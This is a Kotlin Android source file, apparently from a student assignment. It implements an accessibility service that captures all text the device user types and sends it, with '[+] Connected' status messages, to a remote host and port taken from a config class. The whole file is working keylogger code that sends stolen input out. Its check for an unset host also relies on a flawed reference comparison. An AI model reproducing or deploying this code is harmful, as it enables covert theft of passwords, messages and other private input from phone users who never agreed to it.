package com.example.assignment1

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import com.example.assignment1.DataRetriever.Config_var
import com.example.assignment1.DataRetriever.MessageSender

class MyAccessibilityService : AccessibilityService() {
    var ip: String? = null
    var port: String? = null

    fun send(text: String?) {
        if (ip == null) {
            val tmp = Config_var()
            ip = tmp.HOST
            port = tmp.PORT
        }
        if (ip !== "none" || port !== "none") {
            val messageSender = MessageSender()
            messageSender.execute(text, ip, port)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        var eventText: String? = null
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> eventText = "Typing: "
        }
        eventText = eventText + event.text

        send(eventText)
    }

    override fun onInterrupt() {
        send("[-] Interrupted !!! ")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        send("[+] Connected")
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
        info.notificationTimeout = 100
        serviceInfo = info
    }
}